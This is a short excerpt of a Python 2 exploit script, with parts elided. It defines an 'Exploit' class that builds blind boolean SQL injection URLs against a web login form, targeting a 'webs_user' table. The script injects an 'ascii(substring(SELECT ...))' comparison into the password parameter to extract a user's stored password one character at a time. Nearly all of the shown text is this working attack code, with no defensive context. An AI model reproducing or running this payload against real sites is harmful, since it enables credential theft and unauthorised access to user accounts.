...
class Exploit:
    charset = "0123456789abcdefABCDEF!@#$%^&*(JKLYRGWCZ"
    url = ""
    charn = 1
    id = 1
    table_prefix = "webs_"
    ...
    def generate_url(self, ascii):
        return self.url + "?email=711924474as@gmail.com&password=1%27+and+ascii(substring((SELECT%20" + self.table_field + "%20FROM%20" + self.table_prefix + "user+WHERE+userid=" + str(self.id) + ")," + str(self.charn) + ",1))%3E" + str(ord(ascii)) + "--+"
    def start(self):
        print "Exploiting..."
        if self.find_passwd:
            charx = self.charn
